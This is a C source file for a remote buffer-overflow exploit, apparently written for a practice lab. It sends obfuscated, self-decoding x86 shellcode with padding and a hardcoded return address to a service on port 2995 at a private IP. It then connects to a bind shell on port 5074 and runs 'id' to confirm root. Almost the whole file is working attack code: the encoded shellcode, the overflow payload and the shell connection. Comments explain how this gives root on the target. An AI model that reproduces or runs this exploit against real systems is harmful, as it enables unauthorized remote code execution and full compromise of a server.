//Just sent the buffer to the server through socket
//then the server will jump to the copy of our buffer(on heap) and get root privilege, and listen on port 5074
//so we use "nc serveraddress 5074" to connect to the server and type "id" ,so we get root.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 2995
void fatal(const char* err){
   printf("%s/n",err);
   exit(-1);
}

char shellcode[] = 
/* _start */
"\xeb\x02"          /* jmp short A          */
 
/* A */
"\xeb\x05"          /* jmp short C          */
 
/* B */
"\xe8\xf9\xff\xff\xff"      /* call A               */
 
/* C */
"\x5f"              /* pop edi              */
"\x81\xef\xdf\xff\xff\xff"  /* sub edi, 0xffffffdf  */
"\x57"              /* push edi             */
"\x5e"              /* pop esi              */
"\x29\xc9"          /* sub ecx, ecx         */
"\x80\xc1\xb8"          /* add cl, 0xb8         */
 
/* bucle */
"\x8a\x07"          /* mov al, byte [edi]   */
"\x2c\x41"          /* sub al, 0x41         */
"\xc0\xe0\x04"          /* shl al, 4            */
"\x47"              /* inc edi              */
"\x02\x07"          /* add al, byte [edi]   */
"\x2c\x41"          /* sub al, 0x41         */
"\x88\x06"          /* mov byte [esi], al   */
"\x46"              /* inc esi              */
"\x47"              /* inc edi              */
"\x49"              /* dec ecx              */
"\xe2\xed"          /* loop bucle           */
/* Shellcode codificada de 184 (0xb8) bytes */
"DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB"
"AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA"
"JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO"
"BLAALMNIA";

int main()
{
   int sockfd;
   struct sockaddr_in target_addr;
   unsigned char result[1024];
   unsigned char buffer[1024];

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
         fatal("in socket");

   target_addr.sin_family = AF_INET;
   target_addr.sin_port = htons(PORT);
   target_addr.sin_addr.s_addr =inet_addr("192.168.209.158");
   memset(&(target_addr.sin_zero), '\0', 8); // Zero the rest of the struct.

   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
      fatal("connecting to target server 1");
   
   char array[307];
   for(int i=0;i<306;++i)
      array[i]='A';
   array[306]='\0';

   char *returnAddr = "\x5f\x8d\x04\x08";
   sprintf(buffer,"%s%s%s\n",shellcode,array,returnAddr);
   if(send(sockfd,buffer,1024,0)==-1)
      fatal("send erro");
   
   close(sockfd);

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
         fatal("in socket");

   target_addr.sin_family = AF_INET;
   target_addr.sin_port = htons(5074);
   target_addr.sin_addr.s_addr =inet_addr("192.168.209.158");
   memset(&(target_addr.sin_zero), '\0', 8); // Zero the rest of the struct.

   sleep(2); //wait the server to set up
   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
      fatal("connecting to target server 2");

   memset(buffer,0,sizeof(buffer));

   sprintf(buffer,"id\n");
   if(send(sockfd,buffer,1024,0)==-1)
      fatal("send erro");

   if(recv(sockfd,result,1024,0)==-1)
      fatal("recv erro");

   printf("%s\n",result);
  
}
